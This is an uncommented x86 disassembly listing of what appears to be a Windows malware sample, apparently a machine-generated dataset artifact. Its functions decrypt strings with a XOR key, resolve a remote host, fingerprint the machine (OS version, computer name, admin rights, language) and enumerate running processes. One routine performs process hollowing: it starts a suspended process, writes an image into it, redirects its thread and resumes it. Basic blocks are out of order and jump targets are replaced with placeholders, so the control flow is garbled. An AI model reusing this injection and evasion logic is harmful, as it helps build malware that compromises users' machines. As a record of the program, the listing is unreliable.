sub_200101f
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x88
push esi
push edi
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_2013580
mov eax [ ebp + 0x7c ]
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0xc
movsb [ edi ] [ esi ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
mov [ ebp + 0x6c ] eax
xor eax eax
cmp [ ebp + 0x6c ] eax
mov [ ebp + 0x68 ] eax
jle r-xdata
mov ecx [ ebp + 0x78 ]
pop edi
mov [ eax + ecx ] 0x0
pop esi
add ebp 0x70
leave
retn
mov esi [ ebp + 0x7c ]
mov edi [ ebp + 0x78 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
cmp eax [ ebp + 0x6c ]
mov [ ebp + 0x68 ] eax
jl r-xdata
xor cl dl
push 0xa
cdq
pop ebx
idiv ebx
mov cl [ esi ]
mov dl [ ebp + edx - 0x18 ]
cmp cl dl
je r-xdata
pop ebx
sub_200109f
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x84
push esi
push edi
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_2013580
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
add esp 0xc
movsb [ edi ] [ esi ]
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x7c ] eax
jbe r-xdata
pop edi
pop esi
add ebp 0x6c
leave
retn
mov esi [ ebp + 0x78 ]
mov edi [ ebp + 0x74 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
mov [ ebp + 0x68 ] eax
cmp eax [ ebp + 0x7c ]
jb r-xdata
xor edx edx
push 0xa
pop ebx
div ebx
movzx eax cl
mov dl [ ebp + edx - 0x18 ]
movsx ebx dl
cmp eax ebx
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebx
xor cl dl
sub_2001111
push ebp
mov ebp esp
sub esp 0x194
test esi esi
je r-xdata
xor eax eax
leave
retn
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x194 ]
push eax
push 0x202
call WSAStartup
test eax eax
jne r-xdata
push esi
call inet_addr
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
sub edx esi
push esi
call gethostbyname
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
call WSACleanup
xor eax eax
inc eax
leave
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx eax
shr ecx 0x18
push ecx
mov ecx eax
shr ecx 0x10
movzx ecx cl
push ecx
mov ecx eax
shr ecx 0x8
movzx ecx cl
push ecx
movzx eax al
push eax
push r--data
push [ ebp + 0x8 ]
call sub_2009be6
add esp 0x18
jmp r-xdata
sub_20011b0
push ebp
mov ebp esp
sub esp 0x230
push ebx
push esi
xor eax eax
xor ebx ebx
mov esi 0x104
push esi
mov [ ebp - 0xc ] ax
mov [ ebp - 0xa ] ax
mov [ ebp - 0x8 ] ax
mov [ ebp - 0x6 ] ax
lea eax [ ebp - 0x127 ]
push ebx
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x128 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x22f ]
push ebx
push eax
mov [ ebp - 0x230 ] bl
call sub_2013580
lea eax [ ebp - 0x128 ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x230 ]
push r--data
push eax
call sub_200101f
add esp 0x28
lea eax [ ebp - 0x128 ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
pop esi
pop ebx
leave
retn
lea ecx [ ebp - 0x230 ]
push ecx
push eax
call [ GetProcAddress@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push edi
lea eax [ ebp - 0x10 ]
push eax
push ebx
call esi
cmp eax 0x6f
jne r-xdata
mov esi [ ebp - 0x4 ]
push [ ebp - 0x10 ]
call sub_2009eef
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push eax
mov [ ebp - 0x4 ] eax
call esi
test eax eax
je r-xdata
mov esi [ esi ]
cmp esi ebx
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
mov edi [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
call sub_2009d98
pop ecx
jmp r-xdata
lea eax [ esi + 0x1b0 ]
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x4 ]
lea eax [ esi + 0x1b0 ]
lea edx [ ebp - 0x20 ]
sub edx eax
pop edi
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
lea eax [ ebp - 0x20 ]
xor edi edi
push eax
jmp r-xdata
call sub_200a1e4
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
push eax
call sub_200a075
mov [ ebp + edi * 2 - 0xc ] ax
inc edi
cmp edi 0x4
pop ecx
jg r-xdata
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_2009be6
movsx eax [ ebp - 0x6 ]
push eax
movsx eax [ ebp - 0x8 ]
push eax
movsx eax [ ebp - 0xa ]
push eax
movsx eax [ ebp - 0xc ]
push eax
push r--data
push [ ebp + 0xc ]
call sub_2009be6
push [ ebp - 0x4 ]
call sub_2009d98
add esp 0x3c
push r--data
push ebx
sub_200136b
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0xc0
push edi
mov edi 0x9c
push edi
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_2013580
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] edi
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
pop edi
add ebp 0x78
leave
retn
mov eax [ ebp - 0x44 ]
sub eax 0x4
push ebx
push 0x1
pop ebx
je r-xdata
cmp [ ebp - 0x40 ] 0x5a
sete al
lea eax [ eax * 4 + 0x4 ]
dec eax
je r-xdata
lea ecx [ ebp + 0x54 ]
push ecx
call eax
lea eax [ ebp + 0x54 ]
push eax
call [ GetSystemInfo@IAT ]
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
dec eax
je r-xdata
or [ esi ] bl
cmp [ ebp + 0x54 ] 0x6
jne r-xdata
cmp [ ebp + 0x54 ] 0x9
je r-xdata
cmp [ ebp - 0x40 ] ebx
jne r-xdata
mov [ esi ] 0xc
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
pop ebx
cmp [ ebp - 0x40 ] 0x2
jne r-xdata
mov [ esi ] 0x10
jmp r-xdata
push 0x9
pop ecx
push r--data
xor eax eax
lea edi [ ebp + 0x54 ]
push r--data
[ edi ]
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x40 ] ebx
jne r-xdata
cmp [ ebp + 0x52 ] bl
setne al
lea eax [ eax * 4 + 0x18 ]
jmp r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x52 ] bl
sete al
dec al
and al 0xfd
add al 0x20
jmp r-xdata
mov [ esi ] al
cmp [ ebp + 0x52 ] bl
setne al
dec al
and al 0xfd
add al 0x14
jmp r-xdata
mov [ esi ] 0x15
jmp r-xdata
sub_2001477
push ebp
mov ebp esp
mov eax 0x1360
call sub_2022d90
push ebx
push esi
push edi
xor ebx ebx
push 0xeff
lea eax [ ebp - 0x135b ]
push ebx
push eax
mov [ ebp - 0x135c ] bl
call sub_2013580
mov esi 0x104
push esi
lea eax [ ebp - 0x22b ]
push ebx
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x22c ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x123 ]
push ebx
push eax
mov [ ebp - 0x124 ] bl
call sub_2013580
lea eax [ ebp - 0x22c ]
push r--data
push eax
call sub_200101f
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_200101f
mov esi [ GetModuleHandleA@IAT ]
add esp 0x34
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call esi
mov edi [ GetProcAddress@IAT ]
push eax
call edi
mov [ ebp - 0x14 ] eax
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x124 ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call esi
push eax
call edi
mov [ ebp - 0x18 ] eax
cmp eax ebx
je r-xdata
xor edi edi
cmp [ rw-data ] bl
je r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x10 ] eax
cmp eax 0xffffffff
je r-xdata
lea ecx [ ebp - 0x135c ]
mov eax rw-data
mov [ ebp - 0x8 ] ecx
lea eax [ ebp - 0x354 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x354 ] 0x128
call [ ebp - 0x14 ]
jmp r-xdata
add [ ebp - 0x8 ] 0xa0
inc edi
mov eax edi
imul eax eax 0x54
lea eax [ eax + rw-data ]
mov [ ebp - 0xc ] edi
cmp [ eax ] bl
jne r-xdata
mov esi [ ebp - 0x8 ]
test eax eax
jne r-xdata
push eax
lea eax [ ebp - 0x45c ]
push eax
call sub_200101f
lea eax [ ebp - 0x45c ]
push r--data
push eax
call sub_200a1e4
add esp 0x10
cmp eax ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
push ebx
call sub_200a1e4
pop ecx
add esi 0x10
pop ecx
cmp eax ebx
jne r-xdata
cmp [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
jle r-xdata
push [ ebp - 0x10 ]
call [ CloseHandle@IAT ]
mov edx esi
sub edx eax
lea eax [ ebp - 0x354 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x354 ] 0x128
call [ ebp - 0x18 ]
mov esi [ ebp - 0x8 ]
imul esi esi 0xa0
lea esi [ ebp + esi - 0x135c ]
mov eax esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
mov edx esi
mov esi [ ebp - 0x8 ]
imul esi esi 0xa0
lea esi [ ebp + esi - 0x135c ]
mov eax [ ebp - 0x8 ]
imul eax eax 0x54
mov ecx [ eax + rw-data ]
mov eax [ ebp + 0x8 ]
or [ eax ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
add esi 0x10
mov eax esi
mov edx esi
lea edi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
jne r-xdata
push edx
lea eax [ ebp - 0x330 ]
push eax
call sub_2009b94
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
sub_20016b0
movzx eax al
xor eax [ esp + 0x4 ]
push 0x8
pop ecx
mov edx eax
and edx 0x1
imul edx edx 0xedb88320
shr eax 0x1
xor eax edx
dec ecx
jne r-xdata
not eax
retn
sub_20016cf
push esi
or eax 0xffffffff
xor esi esi
mov ecx [ esp + 0x8 ]
mov cl [ esi + ecx ]
push eax
movzx eax cl
push eax
call sub_200aa80
pop ecx
call sub_20016b0
inc esi
pop ecx
cmp esi 0x2c
jb r-xdata
pop esi
retn
sub_20016f5
push ebp
mov ebp esp
sub esp 0xc0
xor eax eax
push esi
push edi
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x3c ] 0x0
lea edi [ ebp - 0x3b ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x2c ] 0x0
lea edi [ ebp - 0x2b ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
push 0x3f
xor edi edi
lea eax [ ebp - 0xbf ]
push edi
push eax
mov [ ebp - 0xc0 ] 0x0
call sub_2013580
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x8 ] edi
cmp eax edi
je r-xdata
or eax 0xffffffff
cmp ebx edi
je r-xdata
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
lea esi [ ebp - 0x1 ]
call sub_200136b
cmp [ ebp + 0xc ] edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
call sub_20060e0
test eax eax
je r-xdata
or [ ebp - 0x1 ] 0x80
push 0x4
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_200a0c0
call sub_200a6bf
cdq
mov ecx 0xffff
idiv ecx
movzx eax dx
push eax
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_2009be6
jmp r-xdata
movzx eax [ ebp - 0x1 ]
shl eax 0x18
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_2001477
pop ecx
call [ GetSystemDefaultLangID@IAT ]
movzx eax ax
push eax
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_2009be6
mov eax 0x30303030
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_20011b0
pop ecx
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x8 ] 0x40
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0xc0 ]
lea esi [ eax + 0x1 ]
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
mov al [ ebp - 0x80 ]
mov esi [ ebp + 0x8 ]
mov [ ebx ] al
mov al [ ebp - 0x7f ]
mov [ ebx + 0x1 ] al
mov al [ ebp - 0x7e ]
mov [ ebx + 0x2 ] al
mov [ ebx + 0x4 ] al
mov al [ ebp - 0x7d ]
add esp 0xc
mov [ ebx + 0x3 ] al
mov [ ebx + 0x5 ] al
mov eax [ ebx ]
push 0xa
pop ecx
lea edi [ ebp - 0x80 ]
[ edi ] [ esi ]
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x80 ]
push eax
call sub_20016cf
pop ecx
push eax
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_2009be6
mov al [ ebp - 0x79 ]
mov [ ebx + 0xb ] al
mov al [ ebp - 0x7a ]
mov [ ebx + 0xa ] al
mov al [ ebp - 0x7b ]
mov [ ebx + 0x9 ] al
mov al [ ebp - 0x7c ]
mov [ ebx + 0x8 ] al
mov al [ ebp - 0x7d ]
mov [ ebx + 0x7 ] al
mov al [ ebp - 0x7e ]
mov [ ebx + 0x6 ] al
mov al [ ebp - 0x80 ]
mov [ ebx + 0x2 ] al
mov al [ ebp - 0x7f ]
add esp 0xc
mov [ ebx + 0x3 ] al
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push 0x8
mov esi eax
pop edi
cmp esi edi
mov [ ebp - 0x8 ] esi
jge r-xdata
or [ ebp - 0x1 ] 0x40
push [ ebp - 0xc ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_2009be6
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x20 ]
mov [ eax + 0x8 ] cl
mov cl [ ebp - 0x1f ]
mov [ eax + 0x4 ] cl
mov cl [ ebp - 0x1e ]
mov [ eax + 0x20 ] cl
mov cl [ ebp - 0x1d ]
mov [ eax + 0x1b ] cl
mov cl [ ebp - 0x1c ]
mov [ eax + 0xd ] cl
mov cl [ ebp - 0x1b ]
mov [ eax + 0x3 ] cl
mov cl [ ebp - 0x1a ]
mov [ eax + 0x15 ] cl
mov cl [ ebp - 0x19 ]
mov [ eax + 0x19 ] cl
mov cl [ ebp - 0x18 ]
mov [ eax + 0x23 ] cl
mov cl [ ebp - 0x17 ]
mov [ eax + 0x27 ] cl
mov cl [ ebp - 0x16 ]
mov [ eax + 0x13 ] cl
mov cl [ ebp - 0x15 ]
mov [ eax + 0xf ] cl
mov cl [ ebp - 0x80 ]
mov [ eax ] cl
mov cl [ ebp - 0x7f ]
mov [ eax + 0x24 ] cl
mov cl [ ebp - 0x7e ]
mov [ eax + 0x1d ] cl
mov cl [ ebp - 0x7d ]
mov [ eax + 0x1a ] cl
mov cl [ ebp - 0x7c ]
mov [ eax + 0x22 ] cl
mov cl [ ebp - 0x7b ]
mov [ eax + 0xc ] cl
mov cl [ ebp - 0x7a ]
mov [ eax + 0x10 ] cl
mov cl [ ebp - 0x79 ]
mov [ eax + 0x7 ] cl
mov cl [ ebp - 0xc0 ]
mov [ eax + 0x1f ] cl
mov cl [ ebp - 0xbf ]
mov [ eax + 0x17 ] cl
mov cl [ ebp - 0xbe ]
mov [ eax + 0x25 ] cl
mov cl [ ebp - 0xbd ]
mov [ eax + 0x5 ] cl
mov cl [ ebp - 0xbc ]
mov [ eax + 0xa ] cl
mov cl [ ebp - 0xbb ]
mov [ eax + 0x14 ] cl
mov cl [ ebp - 0xba ]
mov [ eax + 0x12 ] cl
mov cl [ ebp - 0xb9 ]
mov [ eax + 0x1 ] cl
mov cl [ ebp - 0x3c ]
mov [ eax + 0x26 ] cl
mov cl [ ebp - 0x3b ]
mov [ eax + 0xe ] cl
mov cl [ ebp - 0x3a ]
mov [ eax + 0xb ] cl
mov cl [ ebp - 0x39 ]
mov [ eax + 0x11 ] cl
mov cl [ ebp - 0x38 ]
mov [ eax + 0x18 ] cl
mov cl [ ebp - 0x37 ]
mov [ eax + 0x1e ] cl
mov cl [ ebp - 0x36 ]
mov [ eax + 0x21 ] cl
mov cl [ ebp - 0x35 ]
mov [ eax + 0x2 ] cl
mov cl [ ebp - 0x2c ]
add esp 0xc
mov [ eax + 0x6 ] cl
mov cl [ ebp - 0x2b ]
mov [ eax + 0x16 ] cl
mov cl [ ebp - 0x2a ]
mov [ eax + 0x1c ] cl
mov cl [ ebp - 0x29 ]
mov [ eax + 0x9 ] cl
sub edi esi
push edi
lea eax [ ebp + esi - 0xc0 ]
push 0x5f
push eax
call sub_2013580
add esp 0xc
add esi edi
mov [ ebp - 0x8 ] esi
mov [ ebp + esi - 0xc0 ] 0x0
sub_2001a1b
push ebp
mov ebp esp
sub esp 0x688
push ebx
push esi
push edi
mov esi 0x103
push esi
xor ebx ebx
lea eax [ ebp - 0x2ab ]
push ebx
push eax
mov [ ebp - 0x2ac ] 0x0
call sub_2013580
push esi
lea eax [ ebp - 0x3b3 ]
push ebx
push eax
mov [ ebp - 0x3b4 ] bl
call sub_2013580
push esi
lea eax [ ebp - 0x15b ]
push ebx
push eax
mov [ ebp - 0x15c ] bl
call sub_2013580
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
add esp 0x2c
lea eax [ ebp - 0x15c ]
push eax
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
mov esi [ GetProcAddress@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_200101f
pop ecx
pop ecx
lea eax [ ebp - 0x15c ]
push eax
push edi
call esi
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
cmp eax ebx
je r-xdata
push 0x44
pop esi
push esi
lea eax [ ebp - 0x1a4 ]
push ebx
push eax
call sub_2013580
xor eax eax
lea edi [ ebp - 0x2c ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x2cc
stosd [ edi ]
lea eax [ ebp - 0x684 ]
push ebx
push eax
call sub_2013580
mov eax [ ebp + 0x8 ]
add esp 0x18
mov [ ebp - 0x1a4 ] esi
cmp eax ebx
jne r-xdata
lea edx [ ebp - 0x2ac ]
sub edx eax
push 0x104
lea eax [ ebp - 0x2ac ]
push eax
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
mov cl [ ebp + eax - 0x2ac ]
mov [ ebp + eax - 0x3b4 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x3b4 ]
push 0x5c
push eax
call sub_200a930
pop ecx
pop ecx
mov [ eax ] bl
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1 ]
mov cl [ ebp + eax - 0x2ac ]
mov [ ebp + eax - 0x15c ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x3b4 ]
push eax
push ebx
push 0x4
push ebx
push ebx
push ebx
lea eax [ ebp - 0x15c ]
push eax
push ebx
call [ CreateProcessA@IAT ]
push 0x3e8
mov esi eax
call [ Sleep@IAT ]
cmp esi ebx
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x684 ]
push eax
push [ ebp - 0x28 ]
mov [ ebp - 0x684 ] 0x10007
call [ ebp - 0x14 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2ac ]
push eax
lea eax [ ebp - 0x15c ]
push r--data
push eax
call sub_2009be6
add esp 0x10
jmp r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x5e0 ]
add eax 0x8
push eax
push [ ebp - 0x2c ]
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
push 0x1
push [ ebp - 0x2c ]
call [ TerminateProcess@IAT ]
push r--data
call [ LoadLibraryA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push 0x1
push [ ebp - 0x2c ]
mov esi eax
call [ TerminateProcess@IAT ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
mov eax [ ebp - 0x5d4 ]
lea ecx [ ebp - 0x44 ]
push ecx
push 0x40
push 0x20
push eax
push [ ebp - 0x2c ]
mov [ ebp - 0x34 ] eax
call [ VirtualProtectEx@IAT ]
mov edi [ ebp + 0xc ]
mov esi [ edi + 0x3c ]
push 0x4
push 0x3000
add esi edi
push [ esi + 0x50 ]
push [ esi + 0x34 ]
push [ ebp - 0x2c ]
call [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
cmp eax ebx
je r-xdata
push ebx
push [ esi + 0x54 ]
push edi
push eax
push [ ebp - 0x2c ]
call [ ebp - 0x18 ]
test eax eax
je r-xdata
xor ecx ecx
lea eax [ esi + 0xf8 ]
mov [ ebp - 0x14 ] ebx
cmp cx [ esi + 0x6 ]
jae r-xdata
mov eax [ ebp - 0x10 ]
push ebx
mov [ ebp - 0x40 ] eax
push 0x4
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x5e0 ]
add eax 0x8
push eax
push [ ebp - 0x2c ]
mov [ ebp - 0x684 ] 0x10007
call [ ebp - 0x18 ]
test eax eax
je r-xdata
lea ecx [ eax + 0x8 ]
mov [ ebp - 0xc ] ecx
lea ecx [ eax + 0x24 ]
lea ebx [ eax + 0xc ]
lea edi [ eax + 0x10 ]
add eax 0x14
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x30 ] eax
mov ebx [ esi + 0x28 ]
add ebx [ ebp - 0x10 ]
lea eax [ ebp - 0x684 ]
push eax
push [ ebp - 0x28 ]
call [ ebp - 0x38 ]
test eax eax
je r-xdata
push 0x28
pop eax
add [ ebp - 0x30 ] eax
add [ ebp - 0x1c ] eax
add [ ebp - 0xc ] eax
add edi eax
add ebx eax
movzx eax [ esi + 0x6 ]
inc [ ebp - 0x14 ]
cmp [ ebp - 0x14 ] eax
jl r-xdata
test eax eax
je r-xdata
sub ebx [ ebp - 0x34 ]
mov esi r--data
lea edi [ ebp - 0x50 ]
movsd [ edi ] [ esi ]
push 0x0
movsd [ edi ] [ esi ]
push 0xb
lea eax [ ebp - 0x50 ]
push eax
push [ ebp - 0x34 ]
movsw [ edi ] [ esi ]
push [ ebp - 0x2c ]
movsb [ edi ] [ esi ]
sub ebx 0x5
mov [ ebp - 0x4f ] ebx
call [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax ]
add eax [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
push 0x0
push [ edi ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x2c ]
call [ ebp - 0x18 ]
cmp [ edi ] 0x0
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax 0x40000000
je r-xdata
push [ ebp - 0x28 ]
call [ ResumeThread@IAT ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
test eax eax
jns r-xdata
mov [ ebp - 0x8 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
test eax 0x20000000
je r-xdata
mov [ ebp - 0x8 ] 0x4
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
push [ eax ]
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x2c ]
call [ ebp - 0x3c ]
test eax eax
je r-xdata
or [ ebp - 0x8 ] 0x10
test [ ebp - 0x8 ] 0x4
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
test [ ebp - 0x8 ] 0x2
je r-xdata
mov [ ebp - 0x8 ] 0x40
jmp r-xdata
mov [ ebp - 0x8 ] 0x20
sub_2001edb
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
xor ebx ebx
push 0x103
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_2013580
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_200101f
add esp 0x14
xor eax eax
mov cl [ ebp + eax - 0x108 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x20019
push ebx
lea eax [ ebp - 0x208 ]
push eax
push 0x80000000
mov [ ebp - 0x104 ] bl
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
lea esi [ ebp - 0x4 ]
call sub_200224b
pop ecx
cmp eax ebx
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
cmp [ ebp - 0x104 ] 0x22
jne r-xdata
mov cl [ ebp + eax - 0x104 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
mov cl [ ebp + eax - 0x103 ]
mov [ ebp + eax - 0x208 ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
push r--data
jmp r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ebp - 0x208 ]
mov ecx eax
sub edx ecx
lea esi [ ebp - 0x104 ]
mov ecx eax
sub esi eax
lea eax [ ebp - 0x208 ]
push eax
call sub_200a1e4
pop ecx
pop ecx
lea eax [ ebp - 0x208 ]
push r--data
push eax
call sub_2009fc0
pop ecx
pop ecx
cmp eax ebx
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
